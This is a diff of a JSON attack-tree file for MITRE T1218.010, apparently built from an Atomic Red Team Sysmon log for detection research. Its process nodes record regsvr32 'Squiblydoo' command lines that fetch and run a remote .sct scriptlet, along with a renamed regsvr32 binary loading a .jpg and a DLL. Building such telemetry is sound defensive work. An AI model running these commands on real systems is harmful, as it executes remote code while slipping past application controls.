@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1218.010",
-  "generated_at_utc": "2026-05-08T16:35:31.290191+00:00",
+  "generated_at_utc": "2026-05-08T17:48:58.206296+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1218.010\\atomic_red_team\\windows-sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1218.010\\atomic_red_team\\windows-sysmon.log"
@@ -166,27 +166,51 @@
   },
   "nodes": [
     {
-      "id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
-      "label": "powershell.exe",
+      "id": "Process:{FF16AF91-36E1-6013-7103-00000000A401}:1",
+      "label": "windows command processor",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "",
-        "guid": "{FF16AF91-26EB-6013-9600-00000000A401}",
-        "pid": "4668",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
+        "process_name": "windows command processor",
+        "guid": "{FF16AF91-36E1-6013-7103-00000000A401}",
+        "pid": "1924",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
+        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
+        "id": "Process:{FF16AF91-36E1-6013-7103-00000000A401}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:10",
+      "label": "regsvr32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "regsvr32.exe",
+        "guid": "{8e433fbf-36df-6013-9c03-000000001100}",
+        "pid": "10076",
+        "image_path": "%system32%\\regsvr32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1478 for regsvr32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "4b3d478e6fc4afb005f238f49b26074640b958e8bfbf49358b7a2175459b36ef",
+        "parent_process_id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "regsvr32.exe",
+        "name": "regsvr32.exe"
       }
     },
     {
@@ -227,784 +251,27 @@
       }
     },
     {
-      "id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{8e433fbf-3433-6013-2203-000000001100}",
-        "pid": "6680",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:10",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "regsvr32.exe",
-        "guid": "{8e433fbf-36df-6013-a303-000000001100}",
-        "pid": "5408",
-        "image_path": "%syswow64%\\regsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x100000 for regsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "acfc804965fbb3f02174cfa23f08391c929fbc392cf365924e6a6f52e516373b",
-        "parent_process_id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{8e433fbf-2a44-6013-1100-000000001100}",
-        "pid": "1116",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8e433fbf-2a44-6013-1100-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{8e433fbf-2a47-6013-6b00-000000001100}",
-        "pid": "5532",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{FF16AF91-26B7-6013-1500-00000000A401}",
-        "pid": "1492",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{FF16AF91-26B7-6013-1500-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36F2-6013-7C03-00000000A401}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{FF16AF91-36F2-6013-7C03-00000000A401}",
-        "pid": "2292",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
-        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36F2-6013-7C03-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7103-00000000A401}:1",
-      "label": "windows command processor",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{FF16AF91-36E1-6013-7103-00000000A401}",
-        "pid": "1924",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "d6c50ff6139393f02316cd441c557020cab45f2824262c86456802f79fb473f4",
-        "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7103-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows command processor",
-        "name": "windows command processor"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{FF16AF91-36E1-6013-7903-00000000A401}",
-        "pid": "2324",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "%system32%\\regsvr32.exe  \\s %temp%\\chocolatey\\shell32.jpg",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=8CF9086BE38A15E905924B4A45D814D9,SHA256=00A1CF85C6AB96DF38A4023F0CEE4DF60F62280768FC9C06A235E6D2D644169D,IMPHASH=1C8D7F52BBDAEF92EB0104CB6362D5D0",
-        "command_hash": "fbfcc041b12832d83b537282c7859142af895ac87d23448b542a6a81d5330e83",
-        "parent_process_id": "Process:{FF16AF91-36E1-6013-7703-00000000A401}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7903-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-6E03-00000000A401}:1",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{FF16AF91-36E1-6013-6E03-00000000A401}",
-        "pid": "1984",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=8CF9086BE38A15E905924B4A45D814D9,SHA256=00A1CF85C6AB96DF38A4023F0CEE4DF60F62280768FC9C06A235E6D2D644169D,IMPHASH=1C8D7F52BBDAEF92EB0104CB6362D5D0",
-        "command_hash": "edd28ac29a58a48a9706cd7bd8f0b2685e5f819a09aa9dc529d96be107ac5ed6",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-6E03-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe",
-        "parent_process_id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{FF16AF91-36E1-6013-7503-00000000A401}",
-        "pid": "5260",
-        "image_path": "%syswow64%\\regsvr32.exe",
-        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=56CF190F4143DC68800C4125D6001B07,SHA256=F72ED4D11C9971A9B7CE0A5681EE35968A6B4CCDC2F2B3A9F3E81418605FA467,IMPHASH=D053774A49BA83FF54C68888CB687C6C",
-        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
-        "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe",
-        "parent_process_id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:10",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "regsvr32.exe",
-        "guid": "{FF16AF91-36E1-6013-7503-00000000A401}",
-        "pid": "5260",
-        "image_path": "%syswow64%\\regsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for regsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "ed66cd3696e31975c08348aee040a2bb5ff1e66bbb086de1c4acd9b155728f41",
-        "parent_process_id": "Process:{FF16AF91-26BA-6013-2300-00000000A401}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{FF16AF91-36E1-6013-7503-00000000A401}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe"
-      }
-    },
-    {
-      "id": "File:06e06ba86a97de3397e34ad14f1cb900b578b84c114fbfed4ee76446879a18aa:11",
-      "label": "regsvr32.txt",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "c:\\temp\\regsvr32.txt",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "event_id": "11",
-        "id": "File:06e06ba86a97de3397e34ad14f1cb900b578b84c114fbfed4ee76446879a18aa:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "regsvr32.txt",
-        "name": "regsvr32.txt"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
+      "id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
       "label": "cmd.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{8e433fbf-3708-6013-ba03-000000001100}",
-        "pid": "7360",
+        "guid": "{FF16AF91-36E1-6013-6D03-00000000A401}",
+        "pid": "6620",
         "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s %temp%\\shell32.jpg",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "1fb84c6eb812cf3134cd8fdcdca39c49c3419f964016036320e1cc5d58528237",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8e433fbf-3707-6013-b103-000000001100}",
-        "pid": "4716",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"c:\\temp\\notregsvr32.exe \\s \\u \\i:c:\\temp\\regsvr32.txt scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "d23634689d65326167d0cab15e46e2aee8a03c4b7e50df6c6424e3d0fc406904",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-36df-6013-9f03-000000001100}",
-        "pid": "10200",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "%system32%\\regsvr32.exe  \\s \\u \\i:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "9d8238768dfb1b0126c45718b401de619556ee256c55abeda4b861e5cb82346a",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe",
-        "parent_process_id": "Process:{8e433fbf-36df-6013-9e03-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36e1-6013-a603-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-36e1-6013-a603-000000001100}",
-        "pid": "6696",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "%system32%\\regsvr32.exe  \\s %temp%\\shell32.jpg",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "2d02a58c4932a6cdb04ba1f79241e33a6860802a596b4595c9ab48fdf12e4ed3",
-        "parent_process_id": "Process:{8e433fbf-36e1-6013-a503-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36e1-6013-a603-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{FF16AF91-36E1-6013-7403-00000000A401}",
-        "pid": "2192",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"if \"%processor_architecture%\"==\"amd64\" (%syswow64%\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll) else ( %windir%\\system32\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll )",
+        "command_line": "%system32%\\cmd.exe\" \\c \"%windir%\\system32\\regsvr32.exe \\s \\u \\i:c:\\atomicredteam\\atomics\\t1218.010\\src\\regsvr32.sct scrobj.dll <regsvr32_squiblydoo>",
         "original_file_name": "cmd.exe",
         "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "18afeecdce2e9c7032df23a17d77b76d8ea94f1ef60547fb7a8bc4246b621e75",
+        "command_hash": "a4028c6aeb9f5e635425f1ff8cddfda73f58f8b4543826576cb0c7198cccf5d3",
         "event_id": "1",
-        "id": "Process:{FF16AF91-36E1-6013-7403-00000000A401}:1",
+        "id": "Process:{FF16AF91-36E1-6013-6D03-00000000A401}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
         "name": "cmd.exe",
         "parent_process_id": "Process:{FF16AF91-26EB-6013-9600-00000000A401}:1",
         "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-3708-6013-bb03-000000001100}",
-        "pid": "5928",
-        "image_path": "c:\\temp\\notregsvr32.exe",
-        "command_line": "c:\\temp\\notregsvr32.exe  \\s %temp%\\shell32.jpg",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "e6996c4942efbf83f395cff13de299a5ee7a42106dd0d6e5490c54f5068a3d6f",
-        "parent_process_id": "Process:{8e433fbf-3708-6013-ba03-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{8e433fbf-3708-6013-b703-000000001100}",
-        "pid": "6088",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"if \"%processor_architecture%\"==\"amd64\" (%syswow64%\\regsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll) else ( c:\\temp\\notregsvr32.exe \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll )",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18",
-        "command_hash": "f10871028002fefd1448666201cc7ee82e36ecf56c8dec48c876cbcd5ca2248a",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3708-6013-b703-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{8e433fbf-3433-6013-2203-000000001100}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:10",
-      "label": "notregsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "notregsvr32.exe",
-        "guid": "{8e433fbf-3708-6013-b503-000000001100}",
-        "pid": "10452",
-        "image_path": "c:\\temp\\notregsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1000 for notregsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "51b2beceb2ca51d931aef04db6848e3147a31f5c50ad764db40dd5fd340126fd",
-        "parent_process_id": "Process:{8e433fbf-2a47-6013-6b00-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8e433fbf-3708-6013-b503-000000001100}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "notregsvr32.exe",
-        "name": "notregsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-36df-6013-a303-000000001100}",
-        "pid": "5408",
-        "image_path": "%syswow64%\\regsvr32.exe",
-        "command_line": "%syswow64%\\regsvr32.exe  \\s c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx86.dll",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=EB3B90B6989227F590BB36356DF96A30,SHA256=F80B4224C670E76E05A70CC5403818B11C7A4CA10542A1F9B5D935E4FCA08579,IMPHASH=99BBF1337F3DA5CFAB67854DF4ADE1D8",
-        "command_hash": "8771c8a124490a0e1c7c771c80493fda8c66c724714ca48c7e113f374ed575f7",
-        "parent_process_id": "Process:{8e433fbf-36df-6013-a203-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-36df-6013-a303-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:10",
-      "label": "regsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "regsvr32.exe",
-        "guid": "{8e433fbf-36df-6013-9c03-000000001100}",
-        "pid": "10076",
-        "image_path": "%system32%\\regsvr32.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1478 for regsvr32.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "4b3d478e6fc4afb005f238f49b26074640b958e8bfbf49358b7a2175459b36ef",
-        "parent_process_id": "Process:{8e433fbf-2a44-6013-0c00-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{8e433fbf-36df-6013-9c03-000000001100}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe"
-      }
-    },
-    {
-      "id": "Registry:83fe67497fb55ad84a8aab97a7957d7ee1b80a1d475c3e79e597b6fc0b5920a3:13",
-      "label": "regsvr32.exe",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\BAM\\STATE\\USERSETTINGS\\S-1-5-21-1117338214-1411020952-3261875682-500\\\\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32",
-        "value_name": "regsvr32.exe",
-        "value_data": "Binary Data",
-        "source_image_path": "%system32%\\regsvr32.exe",
-        "parent_process_id": "Process:{8e433fbf-36df-6013-9f03-000000001100}:1",
-        "event_id": "13",
-        "id": "Registry:83fe67497fb55ad84a8aab97a7957d7ee1b80a1d475c3e79e597b6fc0b5920a3:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "regsvr32.exe",
-        "name": "regsvr32.exe"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:1",
-      "label": "microsoft(c) register server",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "microsoft(c) register server",
-        "guid": "{8e433fbf-3707-6013-b203-000000001100}",
-        "pid": "8580",
-        "image_path": "c:\\temp\\notregsvr32.exe",
-        "command_line": "c:\\temp\\notregsvr32.exe  \\s \\u \\i:c:\\temp\\regsvr32.txt scrobj.dll <regsvr32_squiblydoo>",
-        "original_file_name": "regsvr32.exe",
-        "image_hash": "MD5=578BAB56836A3FE455FFC7883041825B,SHA256=8FFC7F80EFBF746E49F37EA3D140F042CF71EF20B4DA2A8F02688E79295DA11D,IMPHASH=0235FF9A007804882636BCCCFB4D1A2F",
-        "command_hash": "8ab86fd6fead2fa400588961dbc0aa17a59c5a1fced2e93bda378d33b3aaf148",
-        "parent_process_id": "Process:{8e433fbf-3707-6013-b103-000000001100}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{8e433fbf-3707-6013-b203-000000001100}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "microsoft(c) register server",
-        "name": "microsoft(c) register server"
-      }
-    },
-    {
-      "id": "Process:{8e433fbf-3708-6013-bb03-000000001100}:10",
-      "label": "notregsvr32.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "notregsvr32.exe",
-        "guid": "{8e433fbf-3708-6013-bb03-000000001100}",
-        "pid": "5928",
-        "image_path": "c:\\temp\\notregsvr32.exe",
